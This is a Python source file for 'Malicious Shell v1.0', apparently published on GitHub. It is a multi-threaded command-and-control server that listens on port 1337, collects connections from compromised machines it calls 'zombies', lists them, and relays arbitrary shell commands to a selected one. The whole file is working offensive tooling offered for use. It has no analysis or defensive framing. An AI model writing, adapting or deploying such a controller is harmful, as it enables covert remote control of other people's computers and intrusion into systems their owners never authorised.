import socket
import threading
import sys
import os
clear = lambda : os.system('clear')
kill = lambda : os.system('exit')

# Coded by Malicious, made public on GitHub


from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


def start():
    try:
        global host
        global port
        global s
        host = ''
        port = 1337
        s = socket.socket()
    except socket.error as msg:
        print("[-] Socket creation error: " + str(msg))


def socket_bind():
    try:
        global host
        global port
        global s
        print("[+] Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
        file = open("banner.txt", "r").readlines()
        for x in file:
            x = x.strip()
            sys.stdout.write(x + "\n")
    except socket.error as msg:
        print("[-] Socket binding error: " + str(msg) + "\n" + "[%] Retrying")
        socket_bind()


def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\n[+] Zombie has been connected: " + address[0])
        except:
            print("[-] Error connecting zombie/s")


def start_command():
    while True:
        print("")
        cmd = input('Command:~# ')
        if cmd == 'zombies':
            list_connections()
        elif cmd == 'help':
            print("================")
            print("Malicious Shell v1.0")
            print("================")
            print("1. zombies = List all zombies.")
            print("2. control = Control specific Zombie-ID")
            print("3. clear = Clear all messages/outputs.")
            print("4. banner = Show banner.")
            print("5. quit = Kills program.")
        elif cmd == "clear":
            clear()
        elif cmd == "kill":
            kill()
        elif cmd == "zombies":
            list_connections()
        elif cmd == "banner":
            show_banner()
        elif 'control' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("[-] Wrong command.")

# Also for the show_banner to work you will need to make a banner.txt with whatever text / ASCII banner you want.
# Example here:

# .d8b.  .d8888. d888888b d8888b.  .d88b.
# d8' `8b 88'  YP `~~88~~' 88  `8D .8P  Y8.
# 88ooo88 `8bo.      88    88oobY' 88    88
# 88~~~88   `Y8b.    88    88`8b   88    88
# 88   88 db   8D    88    88 `88. `8b  d8'
# YP   YP `8888Y'    YP    88   YD  `Y88P'

def show_banner():
    file = open("banner.txt", "r").readlines()
    for x in file:
        x = x.strip()
        sys.stdout.write(x + "\n")
    start()


def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + ' ' + str(all_addresses[i][0])
    print('---------- Zombies ----------')
    print('ID     |     IP     |     PORT:' + '\n' + results)


def get_target(cmd):
    try:
        target = cmd.replace('control ', '')
        target = int(target)
        conn = all_connections[target]
        print("[+] Connected to Zombie: " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print("[-] No valid selection.")
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf.8")
                print(client_response, end="")
            if cmd == 'quit':
                break
        except:
            print("[-] Connection lost.")
            break


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            start()
            socket_bind()
            accept_connections()
        if x == 2:
            start_command()
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()